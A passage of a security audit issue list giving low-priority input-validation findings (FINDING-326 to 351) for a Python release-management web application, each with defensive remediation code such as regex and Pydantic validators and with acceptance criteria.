    """Validate and normalize revision description."""
    if len(description) > _MAX_DESCRIPTION_LENGTH:
        raise ValueError(f"Description exceeds maximum length of {_MAX_DESCRIPTION_LENGTH}")
    
    # Remove control characters except newlines and tabs
    cleaned = ''.join(c for c in description if c in '\n\t' or not c.iscontrol())
    
    # Trim whitespace
    return cleaned.strip()
```

Apply validation in `create_revision_with_quarantine()` and `finalise_revision()`.

### Acceptance Criteria
- [ ] Maximum length enforced (1000 characters)
- [ ] Control characters removed except newlines/tabs
- [ ] Whitespace trimmed
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Low

---

## Issue: FINDING-326 - SSH Key Fingerprint Lacks Format Validation in Delete Operation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
SSH key fingerprints have a standard format (SHA256:... followed by 43 base64 characters and =), but the delete operation accepts arbitrary strings. Fingerprint format is not validated before database lookup, and error messages include unvalidated user input.

### Details
Affected file: `atr/storage/writers/ssh.py` lines 45-52

There are no documented validation rules for SSH fingerprints.

### Recommended Remediation
Define regex pattern and validate at entry point:

```python
_SSH_FINGERPRINT_PATTERN = r'^SHA256:[A-Za-z0-9+/]{43}=$'

async def delete_key(fingerprint: str):
    """Delete SSH key by fingerprint."""
    if not re.match(_SSH_FINGERPRINT_PATTERN, fingerprint):
        raise storage.AccessError("Invalid SSH key fingerprint format")
    
    # ... existing delete logic (avoid reflecting user input in errors)
```

### Acceptance Criteria
- [ ] Fingerprint format validated with regex
- [ ] Generic error message on invalid format
- [ ] No user input reflected in error messages
- [ ] Unit test verifying format validation

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Low

---

## Issue: FINDING-327 - Category and Language Values Lack Character Set Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Categories and languages are stored as colon-separated strings with validation only for the colon character and forbidden values. No character set, length limits, or format validation exists. Values containing special characters, very long strings, or Unicode edge cases would be stored, potentially causing display issues.

### Details
Affected file: `atr/storage/writers/project.py`
- Lines 95-110: `category_add()`
- Lines 115-130: `language_add()`

### Recommended Remediation
Define patterns and enforce validation:

```python
_CATEGORY_PATTERN = r'^[A-Za-z0-9 /-]+$'
_LANGUAGE_PATTERN = r'^[A-Za-z0-9 /-]+$'
_MAX_VALUE_LENGTH = 64

async def category_add(category: str):
    """Add category with validation."""
    if len(category) > _MAX_VALUE_LENGTH:
        raise ValueError(f"Category exceeds maximum length of {_MAX_VALUE_LENGTH}")
    
    if not re.match(_CATEGORY_PATTERN, category):
        raise ValueError("Category contains invalid characters")
    
    # ... existing logic
```

Apply similar validation to `language_add()`.

### Acceptance Criteria
- [ ] Character set validated (alphanumeric, space, hyphen, slash)
- [ ] Maximum length enforced (64 characters)
- [ ] Invalid characters rejected with clear message
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Low

---

## Issue: FINDING-328 - Token Label Validation Gap Between Form and Storage Layers

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Token labels have validation at the form layer but not at the storage layer. If called from API or other paths without form validation, arbitrarily long or specially crafted labels could be stored. Labels appear in email notifications and UI with no documented maximum length or character set.

### Details
Affected file: `atr/storage/writers/tokens.py` lines 35-55

The `add_token()` function does not validate label parameter.

### Recommended Remediation
Add validation at storage layer:

```python
_MAX_LABEL_LENGTH = 100
_LABEL_PATTERN = r'^[\w\s\-_.]+$'

async def add_token(label: str, ...):
    """Add token with label validation."""
    if len(label) > _MAX_LABEL_LENGTH:
        raise ValueError(f"Label exceeds maximum length of {_MAX_LABEL_LENGTH}")
    
    if not re.match(_LABEL_PATTERN, label):
        raise ValueError("Label contains invalid characters")
    
    # ... existing logic
```

### Acceptance Criteria
- [ ] Maximum length enforced at storage layer (100 characters)
- [ ] Character set validated (alphanumeric, space, hyphen, underscore, period)
- [ ] Validation applies regardless of call path
- [ ] Unit test verifying storage layer validation

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Low

---

## Issue: FINDING-329 - OpenPGP and SSH Key Text Fields Lack Format Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Key upload forms have help text describing expected formats, but no validation enforces these formats at the boundary. Invalid key text passes to downstream parsers which raise exceptions, causing generic parser errors instead of clear validation errors.

### Details
Affected file: `atr/shared/keys.py`
- Lines 110-115: `AddOpenPGPKeyForm`
- Lines 145-150: `AddSSHKeyForm`

Help text documents expected format, but no validation enforces it.

### Recommended Remediation
Add Pydantic field_validators:

```python
class AddOpenPGPKeyForm(BaseModel):
    public_key: str
    
    @pydantic.field_validator('public_key')
    def validate_pgp_key_format(cls, v):
        if not v.strip().startswith('-----BEGIN PGP PUBLIC KEY BLOCK-----'):
            raise ValueError("Key must start with PGP public key block marker")
        if '-----END PGP PUBLIC KEY BLOCK-----' not in v:
            raise ValueError("Key must contain end marker")
        if len(v) > 100_000:
            raise ValueError("Key exceeds maximum size of 100KB")
        return v

class AddSSHKeyForm(BaseModel):
    public_key: str
    
    @pydantic.field_validator('public_key')
    def validate_ssh_key_format(cls, v):
        valid_prefixes = ['ssh-rsa', 'ssh-ed25519', 'ecdsa-sha2-nistp256', 'ecdsa-sha2-nistp384', 'ecdsa-sha2-nistp521']
        if not any(v.strip().startswith(prefix) for prefix in valid_prefixes):
            raise ValueError(f"Key must start with valid key type: {', '.join(valid_prefixes)}")
        if len(v) > 10_000:
            raise ValueError("Key exceeds maximum size of 10KB")
        return v
```

### Acceptance Criteria
- [ ] OpenPGP key format validated (markers, size)
- [ ] SSH key format validated (type prefix, size)
- [ ] Clear error messages for format violations
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Low

---

## Issue: FINDING-330 - phase Field in API Models Lacks Enum Constraint

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The phase field accepts any string via `schema.Field(strict=False)` instead of using a Literal type to constrain values to the valid set `['compose', 'finish']`. This allows arbitrary strings that could cause silent failures in dispatch logic, though no security impact has been identified.

### Details
Affected file: `atr/models/api.py`
- Lines ~120-130: `DistributeSshRegisterArgs`
- Lines ~140-150: `DistributionRecordFromWorkflowArgs`

### Recommended Remediation
Change phase field type to use Literal:

```python
from typing import Literal

class DistributeSshRegisterArgs(BaseModel):
    phase: Literal['compose', 'finish']
    # ... other fields

class DistributionRecordFromWorkflowArgs(BaseModel):
    phase: Literal['compose', 'finish']
    # ... other fields
```

### Acceptance Criteria
- [ ] phase field constrained to valid values
- [ ] Invalid phase values rejected with clear error
- [ ] Unit test verifying constraint enforcement

### References
- Source reports: L1:2.2.1.md
- Related findings: None
- ASVS sections: 2.2.1

### Priority
Low

---

## Issue: FINDING-331 - AddProjectForm.committee_key Bypasses Safe Type Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
AddProjectForm uses plain `str` for committee_key field instead of a safe type, bypassing character validation. This creates inconsistency with other identifier fields that use safe types for validation.

### Details
Affected file: `atr/shared/projects.py`

The committee_key field should use a safe type to ensure consistent validation.

### Recommended Remediation
Create safe.CommitteeKey type or use existing alphanumeric safe type:

```python
# In atr/safe.py (if not already exists)
class CommitteeKey(str):
    """Safe committee key with character validation."""
    def __new__(cls, value: str):
        if not re.match(r'^[a-z0-9-]+$', value):
            raise ValueError("Committee key must be lowercase alphanumeric with hyphens")
        return super().__new__(cls, value)

# In atr/shared/projects.py
class AddProjectForm(BaseModel):
    committee_key: safe.CommitteeKey
    # ... other fields
```

### Acceptance Criteria
- [ ] Safe type created for committee_key
- [ ] AddProjectForm updated to use safe type
- [ ] Consistent with other identifier validation
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: MED-001, LOW-003
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-332 - Optional Safe-Typed URL Parameters Documented as Skipping Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Documentation indicates optional safe-typed URL parameters (`T | None`) skip validation when None, creating potential latent vulnerability. The documentation should clarify actual validation behavior for optional parameters.

### Details
Affected file: `atr/blueprints/common.py`

The documentation may be misleading about when validation is applied.

### Recommended Remediation
Update documentation to clarify validation behavior:

```python
def typed(handler):
    """
    Decorator for type-safe route handlers.
    
    URL parameters with safe types (e.g., safe.ProjectKey) are always validated
    when present. Optional parameters (T | None) allow absence but validate when
    provided.
    
    For truly optional parameters that should skip validation when None,
    consider using explicit OptionalSafeType pattern:
    
        optional_key: Optional[str] | safe.ProjectKey
    
    This makes the intent clear that None bypasses validation while non-None
    values are validated.
    """
```

Consider requiring explicit OptionalSafeType pattern to make intent clear.

### Acceptance Criteria
- [ ] Documentation clarifies validation behavior for optional parameters
- [ ] Behavior is tested and documented accurately
- [ ] Optional: OptionalSafeType pattern implemented

### References
- Source reports: L1:2.2.2.md
- Related findings: None
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-333 - Form Fields Rely on Storage Layer Validation Only

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Some form fields lack early validation at form layer, relying only on storage layer database constraints. This prevents early rejection of invalid input and provides poor user feedback.

### Details
Affected file: `atr/shared/projects.py`

Form fields should validate constraints before submission to storage layer.

### Recommended Remediation
Add Pydantic field validators at form layer:

```python
class ProjectForm(BaseModel):
    category: str
    language: str
    # ... other fields
    
    @pydantic.field_validator('category')
    def validate_category(cls, v):
        allowed_categories = ['Library', 'Network', 'Database', ...]  # from constants
        if v not in allowed_categories:
            raise ValueError(f"Invalid category. Must be one of: {', '.join(allowed_categories)}")
        return v
    
    @pydantic.field_validator('language')
    def validate_language(cls, v):
        allowed_languages = ['Python', 'Java', 'C++', ...]  # from constants
        if v not in allowed_languages:
            raise ValueError(f"Invalid language. Must be one of: {', '.join(allowed_languages)}")
        return v
```

### Acceptance Criteria
- [ ] Form-level validators added for constrained fields
- [ ] Early rejection with clear error messages
- [ ] Better user feedback before storage layer
- [ ] Unit test verifying form-level validation

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-005
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-334 - Rsync Protocol Flags Passed Through Without Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
SSH command validation pipeline validates rsync paths and commands but passes protocol flags through without explicit validation. This could allow unexpected flags in future scenarios.

### Details
Affected file: `atr/ssh.py`

Rsync protocol flags are not explicitly whitelisted.

### Recommended Remediation
Add whitelist validation for allowed rsync protocol flags:

```python
_ALLOWED_RSYNC_FLAGS = {
    '--server',
    '--sender',
    '-vlogDtpre.iLsfxCIvu',  # common rsync flags
    # ... add other allowed flags
}

def validate_rsync_command(args: list[str]):
    """Validate rsync command and flags."""
    if args[0] != 'rsync':
        raise ValueError("Only rsync commands allowed")
    
    for arg in args[1:]:
        if arg.startswith('-'):
            # Check flag against whitelist
            if not any(arg.startswith(allowed) for allowed in _ALLOWED_RSYNC_FLAGS):
                raise ValueError(f"Rsync flag not allowed: {arg}")
        # ... validate paths as existing
```

### Acceptance Criteria
- [ ] Whitelist of allowed rsync flags defined
- [ ] Unexpected flags rejected
- [ ] Defense against future exploits
- [ ] Unit test verifying flag validation

### References
- Source reports: L1:2.2.2.md
- Related findings: None
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-335 - Writer-Layer Category/Language Input Lacks Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Storage writer layer accepts category and language parameters as plain strings without validating against allowed value lists. This creates a defense-in-depth gap where invalid values could be stored if form-layer validation is bypassed.

### Details
Affected file: `atr/storage/writers/project.py`

Category and language parameters should be validated at storage layer.

### Recommended Remediation
Create Literal types or enums for categories and languages:

```python
from typing import Literal

AllowedCategory = Literal[
    'Library',
    'Network',
    'Database',
    'Web',
    # ... all valid categories
]

AllowedLanguage = Literal[
    'Python',
    'Java',
    'C++',
    'JavaScript',
    # ... all valid languages
]

async def category_add(category: AllowedCategory):
    """Add category with type-enforced validation."""
    # ... existing logic

async def language_add(language: AllowedLanguage):
    """Add language with type-enforced validation."""
    # ... existing logic
```

Validate at form layer and storage layer for defense-in-depth.

### Acceptance Criteria
- [ ] Literal types or enums defined for categories and languages
- [ ] Storage layer validates against allowed values
- [ ] Form layer also validates (defense-in-depth)
- [ ] Unit test verifying storage layer validation

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-003, LOW-013, LOW-024
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-336 - Token Label Length Not Enforced at Writer Layer

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Token label field lacks length validation at storage writer layer, potentially allowing excessively long labels if form-layer validation is bypassed.

### Details
Affected file: `atr/storage/writers/tokens.py`

Maximum length should be enforced at storage layer for defense-in-depth.

### Recommended Remediation
Add max_length constraint:

```python
from pydantic import Field

_MAX_LABEL_LENGTH = 100  # or 200

class TokenLabel(BaseModel):
    label: str = Field(..., max_length=_MAX_LABEL_LENGTH)

async def add_token(label: str, ...):
    """Add token with label validation."""
    # Validate length at entry point
    if len(label) > _MAX_LABEL_LENGTH:
        raise ValueError(f"Token label exceeds maximum length of {_MAX_LABEL_LENGTH}")
    
    # ... existing logic
```

### Acceptance Criteria
- [ ] Maximum length enforced at storage layer
- [ ] Recommended maximum: 100-200 characters
- [ ] Form layer also enforces (defense-in-depth)
- [ ] Unit test verifying length enforcement

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-014, LOW-023
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-337 - SVN Revision Parameter Lacks Format Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
SVN revision number parameter accepted as plain string without format validation (should be numeric). This allows non-numeric strings to pass through, potentially causing errors in downstream SVN operations.

### Details
Affected file: `atr/storage/writers/release.py`

SVN revision numbers should be validated as numeric.

### Recommended Remediation
Create safe.SVNRevision type:

```python
# In atr/safe.py
class SVNRevision(str):
    """Safe SVN revision number with numeric validation."""
    def __new__(cls, value: str | int):
        str_value = str(value)
        if not str_value.isdigit():
            raise ValueError("SVN revision must be numeric")
        if int(str_value) < 0:
            raise ValueError("SVN revision must be non-negative")
        return super().__new__(cls, str_value)

# Update storage writer
async def some_function(svn_revision: safe.SVNRevision):
    # ... existing logic
```

### Acceptance Criteria
- [ ] safe.SVNRevision type created with numeric validation
- [ ] Storage writer updated to use safe type
- [ ] Non-numeric values rejected
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: MED-001, MED-008
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-338 - PGP Fingerprint Parameter Not Format-Validated

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
PGP fingerprint parameter in key storage writer lacks format validation (should be 40 hex characters). This allows invalid fingerprint formats to pass through.

### Details
Affected file: `atr/storage/writers/keys.py`

PGP fingerprints should be validated as 40 hexadecimal characters.

### Recommended Remediation
Use safe.PGPFingerprint type (should be defined in MED-003 fix):

```python
# In atr/safe.py (if not already exists)
class PGPFingerprint(str):
    """Safe PGP fingerprint with format validation."""
    def __new__(cls, value: str):
        # Remove spaces and convert to uppercase
        cleaned = value.replace(' ', '').upper()
        
        if not re.match(r'^[0-9A-F]{40}$', cleaned):
            raise ValueError("PGP fingerprint must be 40 hexadecimal characters")
        
        return super().__new__(cls, cleaned)

# Update storage writer
async def some_function(fingerprint: safe.PGPFingerprint):
    # ... existing logic
```

### Acceptance Criteria
- [ ] safe.PGPFingerprint type used in storage writer
- [ ] Format validated (40 hex characters)
- [ ] Invalid formats rejected
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: MED-003
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-339 - Quarantine Task rel_path Lacks Safe Path Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Quarantine processing task uses rel_path parameter without safe.RelPath validation. Risk is low as paths are system-generated, not user-provided, but defense-in-depth would validate even system-generated values.

### Details
Affected file: `atr/tasks/quarantine.py`

The rel_path parameter should use safe.RelPath for consistency.

### Recommended Remediation
Add safe.RelPath validation:

```python
from atr import safe

async def process_quarantine(rel_path: str, ...):
    """Process quarantine with path validation."""
    # Validate even though system-generated
    validated_path = safe.RelPath(rel_path)
    
    # ... existing logic using validated_path
```

### Acceptance Criteria
- [ ] safe.RelPath validation added to rel_path parameter
- [ ] Defense-in-depth maintained for system-generated paths
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: HIGH-001
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-340 - OAuth Callback Code Not URL-Encoded

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
OAuth authorization code parameter not explicitly URL-encoded before use, potentially causing issues with special characters. While OAuth codes are typically base64-url-safe, explicit encoding provides defense-in-depth.

### Details
Affected file: `src/asfquart/generics.py`

Authorization codes should be explicitly URL-encoded when used in URLs or form data.

### Recommended Remediation
Use `urllib.parse.quote()` to URL-encode the authorization code:

```python
from urllib.parse import quote

async def oauth_callback(code: str):
    """Handle OAuth callback with proper encoding."""
    # URL-encode the authorization code
    encoded_code = quote(code, safe='')
    
    # Use encoded_code in URLs or form data
    # ... existing logic
```

### Acceptance Criteria
- [ ] Authorization code explicitly URL-encoded
- [ ] Special characters handled correctly
- [ ] Unit test verifying encoding

### References
- Source reports: L1:2.2.2.md
- Related findings: MED-009
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-341 - Basic Auth Username Not Format-Validated

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
HTTP Basic Authentication username extracted without format validation. While mitigated by downstream LDAP validation, early format validation would provide better error messages and defense-in-depth.

### Details
Affected file: `src/asfquart/session.py`

Username should be validated before passing to LDAP layer.

### Recommended Remediation
Add early format validation:

```python
_USERNAME_PATTERN = r'^[a-z0-9_-]+$'

async def basic_auth(username: str, password: str):
    """Validate Basic Auth with username format check."""
    # Validate username format early
    if not re.match(_USERNAME_PATTERN, username):
        raise AuthenticationError("Invalid username format")
    
    # Pass to LDAP layer
    # ... existing logic
```

### Acceptance Criteria
- [ ] Username format validated early (alphanumeric with dash/underscore)
- [ ] Clear error message for invalid format
- [ ] Defense-in-depth before LDAP layer
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: MED-005
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-342 - Revision Tag Lacks Server-Side Format Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Revision tag field (informational field for release candidates) lacks server-side format validation. Tags like "RC1", "RC2", "BETA1" should follow a consistent format.

### Details
Affected file: `atr/post/revisions.py`

Revision tags should be validated for format consistency.

### Recommended Remediation
Add Pydantic field validator:

```python
class RevisionForm(BaseModel):
    tag: str
    
    @pydantic.field_validator('tag')
    def validate_tag_format(cls, v):
        # Allow RC1, RC2, BETA1, ALPHA1, etc.
        if not re.match(r'^(RC|BETA|ALPHA)\d+$', v, re.IGNORECASE):
            raise ValueError("Tag must be in format: RC1, RC2, BETA1, ALPHA1, etc.")
        
        if len(v) > 20:
            raise ValueError("Tag exceeds maximum length of 20 characters")
        
        return v.upper()  # Normalize to uppercase
```

### Acceptance Criteria
- [ ] Tag format validated (RC/BETA/ALPHA + number)
- [ ] Maximum length enforced
- [ ] Consistent capitalization
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: None
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-343 - Workflow Status Fields Lack Content Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Workflow status fields stored as free-form strings instead of validated enum values, allowing arbitrary status values. Status fields should be constrained to a known set of valid values.

### Details
Affected file: `atr/storage/writers/workflowstatus.py`

Status values should use enum or Literal type.

### Recommended Remediation
Create enum or Literal type for workflow status:

```python
from typing import Literal
from enum import Enum

class WorkflowStatus(str, Enum):
    PENDING = 'pending'
    IN_PROGRESS = 'in_progress'
    COMPLETED = 'completed'
    FAILED = 'failed'
    CANCELLED = 'cancelled'

# Or using Literal:
AllowedStatus = Literal['pending', 'in_progress', 'completed', 'failed', 'cancelled']

async def update_status(status: WorkflowStatus):
    """Update workflow status with validated enum."""
    # ... existing logic
```

### Acceptance Criteria
- [ ] Enum or Literal type defined for allowed status values
- [ ] Storage writer validates against allowed values
- [ ] Arbitrary status values rejected
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-005, LOW-022, LOW-024
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-344 - Email Template Body Not Length-Constrained

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Email template body field lacks maximum length constraint, potentially allowing excessively large templates that cause processing overhead. Template bodies should have reasonable size limits.

### Details
Affected file: `atr/construct.py`

Email template body should be length-constrained.

### Recommended Remediation
Add max_length constraint:

```python
from pydantic import Field

_MAX_TEMPLATE_BODY_LENGTH = 50000  # 50KB

class EmailTemplate(BaseModel):
    body: str = Field(..., max_length=_MAX_TEMPLATE_BODY_LENGTH)
    
    @pydantic.field_validator('body')
    def validate_body_length(cls, v):
        if len(v) > _MAX_TEMPLATE_BODY_LENGTH:
            raise ValueError(
                f"Template body exceeds maximum length of {_MAX_TEMPLATE_BODY_LENGTH} characters"
            )
        return v
```

Recommended maximum: 10,000-50,000 characters depending on use case.

### Acceptance Criteria
- [ ] Maximum length constraint added (10K-50K characters)
- [ ] Pydantic field validator implemented
- [ ] Clear error message if limit exceeded
- [ ] Unit test verifying length constraint

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-006, LOW-023
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-345 - Admin Form Identifier Fields Use Unvalidated str

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Multiple admin interface forms use plain `str` for identifier fields instead of safe types, creating inconsistency with main application forms and bypassing character validation.

### Details
Affected file: `atr/admin/__init__.py`

Admin forms should use safe types for identifier fields.

### Recommended Remediation
Update all admin form identifier fields to use appropriate safe types:

```python
from atr import safe

class AdminProjectForm(BaseModel):
    project_key: safe.ProjectKey  # instead of str
    committee_key: safe.CommitteeKey  # instead of str
    # ... other fields

class AdminUserForm(BaseModel):
    asf_uid: safe.ASFUsername  # instead of str
    # ... other fields
```

Ensure consistency with main application forms.

### Acceptance Criteria
- [ ] All admin form identifier fields use safe types
- [ ] Consistent with main application forms
- [ ] Character validation applied
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: MED-004, MED-005
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-346 - URL Construction Without Encoding in SBOM Supplier Assembly

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
SBOM supplier URL constructed by concatenating unencoded parameters, potentially causing malformed URLs if parameters contain special characters. URL components should be properly encoded before concatenation.

### Details
Affected file: `atr/sbom/conformance.py`

URL parameters need proper encoding.

### Recommended Remediation
Use `urllib.parse.quote()` to encode URL components:

```python
from urllib.parse import quote

def build_supplier_url(namespace: str, component: str):
    """Build supplier URL with proper encoding."""
    encoded_namespace = quote(namespace, safe='')
    encoded_component = quote(component, safe='')
    
    url = f"https://api.deps.dev/v3alpha/systems/{encoded_namespace}/packages/{encoded_component}"
    return url
```

Consider using URL building library like `yarl` or `urllib.parse.urljoin()`.

### Acceptance Criteria
- [ ] URL components properly encoded before concatenation
- [ ] Special characters handled correctly
- [ ] Consider using URL building library
- [ ] Unit test verifying encoding with special characters

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-017
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-347 - URL Construction Without Encoding in OSV Detail Fetch

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
OSV API URL constructed by concatenating unencoded vulnerability ID, potentially causing malformed requests. Vulnerability IDs may contain special characters that need encoding.

### Details
Affected file: `atr/sbom/osv.py`

Vulnerability IDs should be URL-encoded before inclusion in URL path.

### Recommended Remediation
Use `urllib.parse.quote()` to encode vulnerability ID:

```python
from urllib.parse import quote

async def _fetch_vulnerability_details(session, vuln_id: str):
    """Fetch vulnerability details with proper URL encoding."""
    encoded_id = quote(vuln_id, safe='')
    url = f"https://api.osv.dev/v1/vulns/{encoded_id}"
    
    async with session.get(url) as response:
        # ... existing logic
```

### Acceptance Criteria
- [ ] Vulnerability ID URL-encoded before inclusion in path
- [ ] Special characters handled correctly
- [ ] Unit test verifying encoding with special characters

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-016, LOW-018
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-348 - Unhandled ValueError in CWE ID Parsing

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
OSV CWE ID parsing function can raise unhandled ValueError if external API returns malformed CWE data, causing task failure. The function should gracefully handle malformed data instead of failing the entire task.

### Details
Affected file: `atr/sbom/osv.py`

CWE ID parsing should handle malformed input gracefully.

### Recommended Remediation
Add try-except block around CWE parsing:

```python
def parse_cwe_id(cwe_string: str) -> int | None:
    """Parse CWE ID with error handling."""
    try:
        # Extract numeric ID from "CWE-123" format
        if cwe_string.startswith('CWE-'):
            return int(cwe_string[4:])
        else:
            return int(cwe_string)
    except (ValueError, AttributeError) as e:
        logging.warning(f"Failed to parse CWE ID '{cwe_string}': {e}")
        return None  # Continue processing rather than failing
```

Log warning and continue processing rather than failing entire task.

### Acceptance Criteria
- [ ] ValueError handled gracefully
- [ ] Warning logged for malformed data
- [ ] Task continues processing instead of failing
- [ ] Unit test verifying error handling

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-020, LOW-021
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-349 - Silent Validation Error Suppression in ResultsJSON

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
ResultsJSON class silently suppresses Pydantic validation errors during JSON serialization, reducing observability of data quality issues. Validation errors should be logged for monitoring and debugging.

### Details
Affected file: `atr/models/sql.py`

Validation errors are caught and suppressed without logging.

### Recommended Remediation
Log validation errors instead of silently suppressing:

```python
import logging

class ResultsJSON:
    def __get__(self, instance, owner):
        """Get results with validation error logging."""
        if instance is None:
            return self
        
        try:
            # Deserialize and validate
            return self.model.model_validate_json(instance.results_json)
        except ValidationError as e:
            # Log validation error for monitoring
            logging.warning(
                f"Validation error for {owner.__name__} id={instance.id}: {e}",
                extra={'validation_errors': e.errors()}
            )
            # Return None or raise depending on severity
            return None
```

Consider using structured logging to track validation failures for monitoring.

### Acceptance Criteria
- [ ] Validation errors logged instead of silently suppressed
- [ ] Structured logging for monitoring
- [ ] Error context included in logs
- [ ] Unit test verifying error logging

### References
- Source reports: L1:2.2.2.md
- Related findings: None
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-350 - External API Response Data Stored Without Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
GitHub Actions workflow data from external API stored in database without schema validation, potentially storing unexpected or malicious values. External API responses should be validated before storage.

### Details
Affected file: `atr/tasks/gha.py`

GitHub API response data should be validated against expected schema.

### Recommended Remediation
Create Pydantic models for expected GitHub API response schema:

```python
from pydantic import BaseModel, Field, HttpUrl

class GitHubWorkflowRun(BaseModel):
    """Validated schema for GitHub workflow run."""
    id: int
    name: str = Field(..., max_length=255)
    status: Literal['queued', 'in_progress', 'completed']
    conclusion: Literal['success', 'failure', 'cancelled', 'skipped'] | None
    html_url: HttpUrl
    created_at: str = Field(..., max_length=50)
    # ... other fields with constraints

async def fetch_workflow_runs(project: str):
    """Fetch and validate GitHub workflow runs."""
    response_data = await github_api.get(f'/repos/{project}/actions/runs')
    
    # Validate response data before storing
    validated_runs = [
        GitHubWorkflowRun.model_validate(run)
        for run in response_data['workflow_runs']
    ]
    
    # Store validated data
    await store_workflow_runs(validated_runs)
```

Add field length constraints and format validation.

### Acceptance Criteria
- [ ] Pydantic models created for GitHub API response schema
- [ ] Response data validated before storing
- [ ] Field length and format constraints enforced
- [ ] Unit test verifying validation

### References
- Source reports: L1:2.2.2.md
- Related findings: LOW-021, LOW-018
- ASVS sections: 2.2.2

### Priority
Low

---

## Issue: FINDING-351 - Inconsistent External API Response Schema Handling

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
GitHub API response processing assumes specific schema structure without defensive checks, potentially causing unhandled KeyError if schema changes. Dictionary access should use `.get()` with defaults for robustness.

### Details
Affected file: `atr/tasks/gha.py`

Direct dictionary access should be replaced with defensive `.get()` calls.

### Recommended Remediation
Use `.get()` with defaults and implement fallback behavior:

```python
async def process_workflow_run(run_data: dict):
    """Process workflow run with defensive schema handling."""
